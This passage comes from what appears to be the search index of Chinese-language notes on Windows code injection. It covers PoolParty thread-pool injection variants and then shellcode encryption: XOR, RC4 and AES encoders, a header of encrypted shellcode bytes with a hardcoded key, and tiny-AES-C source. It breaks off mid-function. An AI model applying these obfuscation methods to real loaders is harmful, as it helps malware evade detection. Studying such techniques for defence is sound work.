\u8986\u76d6\u73b0\u6709\u5de5\u4f5c\u5668\u5de5\u5382\u7684routine 2\u3001\u5229\u7528\u7ebf\u7a0b\u6c60 \u5411TP_WORK\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_IO\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_WAIT\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_ALPC\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_JOB\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_DIRECT\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_TIMER\u63d2\u5165\u4efb\u52a1\u961f\u5217","title":"PoolParty(2023-12)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#shellcode_2","text":"\u5b89\u88c5openssl\u5e93 https://slproweb.com/products/Win32OpenSSL.html","title":"Shellcode\u52a0\u89e3\u5bc6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_6","text":"\u52a0\u5bc6 #define KEY 0x01 //\u8fdb\u884c\u4ea6\u6216\u7684\u5b57\u7b26 unsigned char buf[] = \"\\xff\"; int main(int argc, char* argv[]) { unsigned char c[sizeof(buf)]; //\u83b7\u53d6shellcode\u957f\u5ea6 for (int i = 0; i < sizeof(buf) - 1; i++) { c[i] = buf[i] ^ KEY;//\u8fdb\u884c\u89e3\u5bc6 printf(\"\\\\x%x\", c[i]); } printf(\"\\n\"); return 0; } \u89e3\u5bc6 #define KEY 0x01 //\u4ea6\u6216\u5b57\u7b26 unsigned char buff[] = \"\\xfd\"; //\u52a0\u5bc6\u540e\u7684\u6570\u636e unsigned char rawData[sizeof(buff)]; //\u83b7\u53d6shellcode\u957f\u5ea6 for (int i = 0; i < sizeof(buff) - 1; i++) { rawData[i] = buff[i] ^ KEY;//\u8fdb\u884c\u89e3\u5bc6 }","title":"\u4ea6\u6216"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#rc4","text":"\u53c2\u8003\u300a0APCLdr-\u5355\u6587\u4ef6\u300b\u9879\u76ee\uff0cBuilder\u4e3a\u52a0\u5bc6\uff0cdecrypt\u4e3a\u89e3\u5bc6\uff0c\u89e3\u5bc6\u4ece\u8d44\u6e90\u8868\u4e2d\u52a0\u8f7d","title":"\u81ea\u5b9a\u4e49RC4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#aes","text":"\u4f9d\u8d56\u4e09\u65b9\u5e93\uff0c\u8c03\u7528\u65f6\u9700\u8981\u628a\u9759\u6001\u5e93\u653e\u7a0b\u5e8f\u4e0b\u9762\u3002 #include <cstdio> #include <openssl/aes.h> #include <corecrt_malloc.h> #pragma comment(lib, \"libcrypto.lib\") #define KEY \"abcdefghijklmnop\" // AES \u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 128 \u4f4d (16 \u5b57\u8282) void aesEncrypt(const unsigned char* key, const unsigned char* input, int inputLength, unsigned char* output) { AES_KEY aesKey; AES_set_encrypt_key(key, 128, &aesKey); AES_encrypt(input, output, &aesKey); } int main() { const char* inputFileName = \"payload.bin\"; // \u8f93\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\u540d const char* outputFileName = \"output.bin\"; // \u8f93\u51fa\u4e8c\u8fdb\u5236\u6587\u4ef6\u540d FILE* inputFile; if (fopen_s(&inputFile, inputFileName, \"rb\") != 0) { printf(\"Failed to open input file.\\n\"); return 1; } // \u83b7\u53d6\u8f93\u5165\u6587\u4ef6\u5927\u5c0f fseek(inputFile, 0, SEEK_END); long inputFileSize = ftell(inputFile); fseek(inputFile, 0, SEEK_SET); // \u5206\u914d\u5185\u5b58\u7528\u4e8e\u5b58\u50a8\u8f93\u5165\u6587\u4ef6\u6570\u636e unsigned char* buf = (unsigned char*)malloc(inputFileSize); if (!buf) { printf(\"Failed to allocate memory.\\n\"); fclose(inputFile); return 1; } // \u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\u6570\u636e\u5230 buf \u6570\u7ec4 fread(buf, 1, inputFileSize, inputFile); fclose(inputFile); // \u5173\u95ed\u8f93\u5165\u6587\u4ef6 // \u5bf9\u6570\u636e\u8fdb\u884c AES \u52a0\u5bc6 unsigned char* encrypted = (unsigned char*)malloc(inputFileSize); aesEncrypt((const unsigned char*)KEY, buf, inputFileSize, encrypted); // \u521b\u5efa\u5e76\u6253\u5f00\u8f93\u51fa\u6587\u4ef6 FILE* outputFile; if (fopen_s(&outputFile, outputFileName, \"wb\") != 0) { printf(\"Failed to create output file.\\n\"); free(buf); free(encrypted); return 1; } // \u5c06\u52a0\u5bc6\u540e\u7684\u6570\u636e\u5199\u5165\u8f93\u51fa\u6587\u4ef6 fwrite(encrypted, 1, inputFileSize, outputFile); fclose(outputFile); // \u5173\u95ed\u8f93\u51fa\u6587\u4ef6 printf(\"Encryption completed.\\n\"); free(buf); free(encrypted); return 0; }","title":"AES"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#aes_1","text":"3\u4e2a\u5934\u6587\u4ef6\uff0c2\u4e2ac\u6587\u4ef6\u3002\u4f7f\u7528python\u811a\u672c\u52a0\u5bc6 \u8be6\u89c1\u300aSetProcessInjection\u300b\u9879\u76ee aes.h \u52a0\u5bc6\u7b97\u6cd5\u5934\u6587\u4ef6 #pragma once #ifndef _AES_H_ #define _AES_H_ #include <stdint.h> #include <stddef.h> // #define the macros below to 1/0 to enable/disable the mode of operation. // // CBC enables AES encryption in CBC-mode of operation. // CTR enables encryption in counter-mode. // ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously. // The #ifndef-guard allows it to be configured before #include'ing or at compile time. #ifndef CBC #define CBC 1 #endif #ifndef ECB #define ECB 1 #endif #ifndef CTR #define CTR 1 #endif //define AES128 1 //#define AES192 1 #define AES256 1 #define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only #if defined(AES256) && (AES256 == 1) #define AES_KEYLEN 32 #define AES_keyExpSize 240 #elif defined(AES192) && (AES192 == 1) #define AES_KEYLEN 24 #define AES_keyExpSize 208 #else #define AES_KEYLEN 16 // Key length in bytes #define AES_keyExpSize 176 #endif struct AES_ctx { uint8_t RoundKey[AES_keyExpSize]; #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1)) uint8_t Iv[AES_BLOCKLEN]; #endif }; void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key); #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1)) void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv); void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv); #endif #if defined(ECB) && (ECB == 1) // buffer size is exactly AES_BLOCKLEN bytes; // you need only AES_init_ctx as IV is not used in ECB // NB: ECB is considered insecure for most uses void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf); void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf); #endif // #if defined(ECB) && (ECB == !) #if defined(CBC) && (CBC == 1) // buffer size MUST be mutile of AES_BLOCKLEN; // Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme // NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv() // no IV should ever be reused with the same key void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length); void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length); #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) // Same function for encrypting as for decrypting. // IV is incremented for every block, and used after encryption as XOR-compliment for output // Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme // NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv() // no IV should ever be reused with the same key void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length); #endif // #if defined(CTR) && (CTR == 1) #endif // _AES_H_ helpers.h \u52a0\u5bc6\u7b97\u6cd5\u5934\u6587\u4ef6 #pragma once #include <windows.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <tchar.h> #include \"aes.h\" #define DEBUG(x, ...) printf(x, ##__VA_ARGS__) static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' }; static char* decoding_table = NULL; static int mod_table[] = { 0, 2, 1 }; static int x64 = 1; extern int AES_KEY_LENGTH; void build_decoding_table(); unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length); BOOL aes_decrypt(const uint8_t* key, size_t szKey, unsigned char* encrypted, size_t szEncrypted, unsigned char* unencryptedData); unsigned char* xor_text(const char* buff); wchar_t* char2wc(const char* buff); sc.h \u8fd9\u91cc\u5b58\u50a8\u52a0\u5bc6\u540e\u7684shellcode\uff0c\u4f7f\u7528python\u6587\u4ef6\u751f\u6210 #define _CRT_SECURE_NO_WARNINGS #pragma once #include <string.h> const char sc_0[16] = {0x50,0x2b,0x32,0x37,0x52,0x73,0x6e,0x63,0x79,0x4c,0x79,0x53,0x31,0x44,0x59,0x45}; char sc_1[16] = {0x46,0x4b,0x4b,0x5a,0x36,0x54,0x51,0x6b,0x4f,0x7a,0x43,0x4c,0x62,0x52,0x31,0x32}; const char sc_2[16] = {0x66,0x44,0x62,0x4d,0x66,0x38,0x47,0x68,0x69,0x39,0x4f,0x34,0x58,0x48,0x67,0x33}; char sc_3[16] = {0x54,0x31,0x32,0x39,0x48,0x54,0x44,0x34,0x4a,0x50,0x50,0x50,0x34,0x5a,0x56,0x33}; const char sc_4[16] = {0x68,0x64,0x57,0x54,0x48,0x79,0x34,0x74,0x43,0x4b,0x41,0x42,0x6d,0x4d,0x32,0x51}; char sc_5[16] = {0x2f,0x45,0x59,0x44,0x66,0x76,0x56,0x36,0x79,0x35,0x49,0x32,0x68,0x4b,0x5a,0x6f}; const char sc_6[16] = {0x35,0x45,0x70,0x58,0x35,0x34,0x38,0x31,0x67,0x54,0x4a,0x75,0x64,0x36,0x75,0x62}; char sc_7[16] = {0x4f,0x36,0x72,0x52,0x59,0x5a,0x70,0x68,0x56,0x50,0x43,0x37,0x57,0x41,0x67,0x61}; const char sc_8[16] = {0x75,0x4e,0x73,0x6e,0x6d,0x56,0x76,0x44,0x7a,0x6f,0x62,0x69,0x36,0x79,0x4b,0x43}; char sc_9[16] = {0x49,0x72,0x2f,0x34,0x6a,0x4a,0x38,0x70,0x38,0x67,0x36,0x43,0x36,0x4e,0x54,0x62}; const char sc_10[16] = {0x70,0x71,0x34,0x4f,0x37,0x6a,0x4c,0x77,0x48,0x76,0x4e,0x76,0x6e,0x57,0x61,0x65}; char sc_11[16] = {0x77,0x39,0x4e,0x48,0x5a,0x39,0x66,0x5a,0x6f,0x33,0x58,0x4e,0x4d,0x4e,0x6f,0x32}; const char sc_12[16] = {0x77,0x38,0x73,0x47,0x64,0x55,0x62,0x6f,0x64,0x31,0x2f,0x44,0x69,0x6b,0x51,0x37}; char sc_13[16] = {0x38,0x44,0x6b,0x4f,0x57,0x4b,0x54,0x55,0x54,0x65,0x69,0x46,0x73,0x51,0x52,0x74}; const char sc_14[16] = {0x52,0x64,0x63,0x47,0x5a,0x63,0x51,0x36,0x5a,0x30,0x72,0x47,0x4b,0x48,0x6f,0x2f}; char sc_15[16] = {0x32,0x61,0x4c,0x54,0x55,0x69,0x55,0x55,0x61,0x51,0x5a,0x43,0x6b,0x6f,0x78,0x50}; const char sc_16[16] = {0x4f,0x34,0x76,0x57,0x72,0x67,0x69,0x6f,0x6a,0x53,0x79,0x76,0x46,0x64,0x68,0x69}; char sc_17[16] = {0x7a,0x75,0x32,0x2b,0x35,0x56,0x41,0x7a,0x34,0x67,0x5a,0x58,0x75,0x7a,0x32,0x6a}; const char sc_18[16] = {0x62,0x4d,0x54,0x32,0x54,0x52,0x2f,0x75,0x4a,0x4c,0x77,0x3d}; char sc[300]; int sc_length = 300; void buildsc_0(){ memcpy(&sc[0], sc_0, 16); memcpy(&sc[16], sc_1, 16); memcpy(&sc[32], sc_2, 16); memcpy(&sc[48], sc_3, 16); memcpy(&sc[64], sc_4, 16); memcpy(&sc[80], sc_5, 16); memcpy(&sc[96], sc_6, 16); memcpy(&sc[112], sc_7, 16); memcpy(&sc[128], sc_8, 16); memcpy(&sc[144], sc_9, 16); memcpy(&sc[160], sc_10, 16); memcpy(&sc[176], sc_11, 16); memcpy(&sc[192], sc_12, 16); memcpy(&sc[208], sc_13, 16); memcpy(&sc[224], sc_14, 16); memcpy(&sc[240], sc_15, 16); memcpy(&sc[256], sc_16, 16); memcpy(&sc[272], sc_17, 16); memcpy(&sc[288], sc_18, 16); } void buildsc(){ buildsc_0(); } BYTE key[] = \"UAigTdFeIYYOvkQjbWUkdfNOffvcutRW\"; aes.c \u52a0\u5bc6\u7b97\u6cd5\u6e90\u6587\u4ef6 /*****************************************************************************/ /* Includes: */ /*****************************************************************************/ #include <string.h> // CBC mode, for memset #include \"aes.h\" #include <stdio.h> /*****************************************************************************/ /* Defines: */ /*****************************************************************************/ // The number of columns comprising a state in AES. This is a constant in AES. Value=4 #define Nb 4 #if defined(AES256) && (AES256 == 1) #define Nk 8 #define Nr 14 #elif defined(AES192) && (AES192 == 1) #define Nk 6 #define Nr 12 #else #define Nk 4 // The number of 32 bit words in a key. #define Nr 10 // The number of rounds in AES Cipher. #endif // jcallan@github points out that declaring Multiply as a function // reduces code size considerably with the Keil ARM compiler. // See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3 #ifndef MULTIPLY_AS_A_FUNCTION #define MULTIPLY_AS_A_FUNCTION 0 #endif /*****************************************************************************/ /* Private variables: */ /*****************************************************************************/ // state - array holding the intermediate results during decryption. typedef uint8_t state_t[4][4]; // The lookup-tables are marked const so they can be placed in read-only storage instead of RAM // The numbers below can be computed dynamically trading ROM for RAM - // This can be useful in (embedded) bootloader applications, where ROM is often limited. static const uint8_t sbox[256] = { //0 1 2 3 4 5 6 7 8 9 A B C D E F 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 }; #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) static const uint8_t rsbox[256] = { 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d }; #endif // The round constant word array, Rcon[i], contains the values given by // x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8) static const uint8_t Rcon[11] = { 0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 }; /* * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12), * that you can remove most of the elements in the Rcon array, because they are unused. * * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon * * \"Only the first some of these constants are actually used ?up to rcon[10] for AES-128 (as 11 round keys are needed), * up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm.\" */ /*****************************************************************************/ /* Private functions: */ /*****************************************************************************/ /* static uint8_t getSBoxValue(uint8_t num) { return sbox[num]; } */ #define getSBoxValue(num) (sbox[(num)]) // This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key) { unsigned i, j, k; uint8_t tempa[4]; // Used for the column/row operations // The first round key is the key itself. for (i = 0; i < Nk; ++i) { RoundKey[(i * 4) + 0] = Key[(i * 4) + 0]; RoundKey[(i * 4) + 1] = Key[(i * 4) + 1]; RoundKey[(i * 4) + 2] = Key[(i * 4) + 2]; RoundKey[(i * 4) + 3] = Key[(i * 4) + 3]; } // All other round keys are found from the previous round keys. for (i = Nk; i < Nb * (Nr + 1); ++i) { { k = (i - 1) * 4; tempa[0] = RoundKey[k + 0]; tempa[1] = RoundKey[k + 1]; tempa[2] = RoundKey[k + 2]; tempa[3] = RoundKey[k + 3]; } if (i % Nk == 0) { // This function shifts the 4 bytes in a word to the left once. // [a0,a1,a2,a3] becomes [a1,a2,a3,a0] // Function RotWord() { const uint8_t u8tmp = tempa[0]; tempa[0] = tempa[1]; tempa[1] = tempa[2]; tempa[2] = tempa[3]; tempa[3] = u8tmp; } // SubWord() is a function that takes a four-byte input word and // applies the S-box to each of the four bytes to produce an output word. // Function Subword() { tempa[0] = getSBoxValue(tempa[0]); tempa[1] = getSBoxValue(tempa[1]); tempa[2] = getSBoxValue(tempa[2]); tempa[3] = getSBoxValue(tempa[3]); } tempa[0] = tempa[0] ^ Rcon[i / Nk]; } #if defined(AES256) && (AES256 == 1) if (i % Nk == 4) { // Function Subword() { tempa[0] = getSBoxValue(tempa[0]); tempa[1] = getSBoxValue(tempa[1]); tempa[2] = getSBoxValue(tempa[2]); tempa[3] = getSBoxValue(tempa[3]); } } #endif j = i * 4; k = (i - Nk) * 4; RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0]; RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1]; RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2]; RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3]; } } void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key) { KeyExpansion(ctx->RoundKey, key); } #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1)) void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv) { KeyExpansion(ctx->RoundKey, key); memcpy(ctx->Iv, iv, AES_BLOCKLEN); } void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv) { memcpy(ctx->Iv, iv, AES_BLOCKLEN); } #endif // This function adds the round key to state. // The round key is added to the state by an XOR function. static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey) { uint8_t i, j; for (i = 0; i < 4; ++i) { for (j = 0; j < 4; ++j) { (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j]; } } } // The SubBytes Function Substitutes the values in the // state matrix with values in an S-box. static void SubBytes(state_t* state) { uint8_t i, j; for (i = 0; i < 4; ++i) { for (j = 0; j < 4; ++j) { (*state)[j][i] = getSBoxValue((*state)[j][i]); } } } // The ShiftRows() function shifts the rows in the state to the left. // Each row is shifted with different offset. // Offset = Row number. So the first row is not shifted. static void ShiftRows(state_t* state) { uint8_t temp; // Rotate first row 1 columns to left temp = (*state)[0][1]; (*state)[0][1] = (*state)[1][1]; (*state)[1][1] = (*state)[2][1]; (*state)[2][1] = (*state)[3][1]; (*state)[3][1] = temp; // Rotate second row 2 columns to left temp = (*state)[0][2]; (*state)[0][2] = (*state)[2][2]; (*state)[2][2] = temp; temp = (*state)[1][2]; (*state)[1][2] = (*state)[3][2]; (*state)[3][2] = temp; // Rotate third row 3 columns to left temp = (*state)[0][3]; (*state)[0][3] = (*state)[3][3]; (*state)[3][3] = (*state)[2][3]; (*state)[2][3] = (*state)[1][3]; (*state)[1][3] = temp; } static uint8_t xtime(uint8_t x) { return ((x << 1) ^ (((x >> 7) & 1) * 0x1b)); } // MixColumns function mixes the columns of the state matrix static void MixColumns(state_t* state) { uint8_t i; uint8_t Tmp, Tm, t; for (i = 0; i < 4; ++i) { t = (*state)[i][0]; Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3]; Tm = (*state)[i][0] ^ (*state)[i][1]; Tm = xtime(Tm); (*state)[i][0] ^= Tm ^ Tmp; Tm = (*state)[i][1] ^ (*state)[i][2]; Tm = xtime(Tm); (*state)[i][1] ^= Tm ^ Tmp; Tm = (*state)[i][2] ^ (*state)[i][3]; Tm = xtime(Tm); (*state)[i][2] ^= Tm ^ Tmp; Tm = (*state)[i][3] ^ t; Tm = xtime(Tm); (*state)[i][3] ^= Tm ^ Tmp; } } // Multiply is used to multiply numbers in the field GF(2^8) // Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary // The compiler seems to be able to vectorize the operation better this way. // See https://github.com/kokke/tiny-AES-c/pull/34 #if MULTIPLY_AS_A_FUNCTION static uint8_t Multiply(uint8_t x, uint8_t y) { return (((y & 1) * x) ^ ((y >> 1 & 1) * xtime(x)) ^ ((y >> 2 & 1) * xtime(xtime(x))) ^ ((y >> 3 & 1) * xtime(xtime(xtime(x)))) ^ ((y >> 4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */ } #else #define Multiply(x, y) \\ ( ((y & 1) * x) ^ \\ ((y>>1 & 1) * xtime(x)) ^ \\ ((y>>2 & 1) * xtime(xtime(x))) ^ \\ ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^ \\ ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))) \\ #endif #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) /* static uint8_t getSBoxInvert(uint8_t num) { return rsbox[num]; } */ #define getSBoxInvert(num) (rsbox[(num)]) // MixColumns function mixes the columns of the state matrix. // The method used to multiply may be difficult to understand for the inexperienced. // Please use the references to gain more information. static void InvMixColumns(state_t* state) { int i; uint8_t a, b, c, d; for (i = 0; i < 4; ++i) { a = (*state)[i][0]; b = (*state)[i][1]; c = (*state)[i][2]; d = (*state)[i][3]; (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09); (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d); (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b); (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e); } } // The SubBytes Function Substitutes the values in the // state matrix with values in an S-box. static void InvSubBytes(state_t* state) { uint8_t i, j; for (i = 0; i < 4; ++i) { for (j = 0; j < 4; ++j) { (*state)[j][i] = getSBoxInvert((*state)[j][i]); } } } static void InvShiftRows(state_t* state) { uint8_t temp; // Rotate first row 1 columns to right temp = (*state)[3][1]; (*state)[3][1] = (*state)[2][1]; (*state)[2][1] = (*state)[1][1]; (*state)[1][1] = (*state)[0][1]; (*state)[0][1] = temp; // Rotate second row 2 columns to right temp = (*state)[0][2]; (*state)[0][2] = (*state)[2][2]; (*state)[2][2] = temp; temp = (*state)[1][2]; (*state)[1][2] = (*state)[3][2]; (*state)[3][2] = temp; // Rotate third row 3 columns to right temp = (*state)[0][3]; (*state)[0][3] = (*state)[1][3]; (*state)[1][3] = (*state)[2][3]; (*state)[2][3] = (*state)[3][3]; (*state)[3][3] = temp; } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) // Cipher is the main function that encrypts the PlainText. static void Cipher(state_t* state, const uint8_t* RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(0, state, RoundKey); // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without MixColumns() for (round = 1; ; ++round) { SubBytes(state); ShiftRows(state); if (round == Nr) { break; } MixColumns(state); AddRoundKey(round, state, RoundKey); } // Add round key to last round AddRoundKey(Nr, state, RoundKey); } #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) static void InvCipher(state_t* state, const uint8_t* RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the 